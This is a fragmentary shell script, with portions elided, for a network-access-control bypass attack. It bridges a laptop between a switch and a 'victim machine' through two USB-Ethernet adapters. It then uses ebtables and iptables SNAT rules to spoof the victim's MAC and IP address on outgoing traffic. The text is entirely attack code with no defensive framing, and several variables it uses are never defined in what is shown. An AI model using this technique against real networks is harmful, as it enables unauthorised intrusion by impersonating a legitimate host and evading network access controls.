...
ININT=enp4s0 #interface of laptop to kill (we prefer to use two usb2eth's)
#SWINT=eth1 #interface of usb2eth plugged into switch
SWINT=enp2s0 #interface of usb2eth plugged into switch
...
COMPINT=enp3s0 #interface of usb2eth plugged into victim machine
...
echo "brctl3"
# brctl addif $BRINT enp4s0 #add switch side to bridge
...
# ifconfig enp4s0  0.0.0.0 up  promisc
echo
...
ebtables -t nat -A POSTROUTING -o $SWINT -j snat --to-src $COMPMAC
ebtables -t nat -A POSTROUTING -o $BRINT -j snat --to-src $COMPMAC
# ebtables -t nat -A POSTROUTING -o enp4s0 -j snat --to-src $COMPMAC
...
iptables -t nat -A POSTROUTING -o $BRINT -p tcp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -p udp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -p icmp -j SNAT --to $COMIP
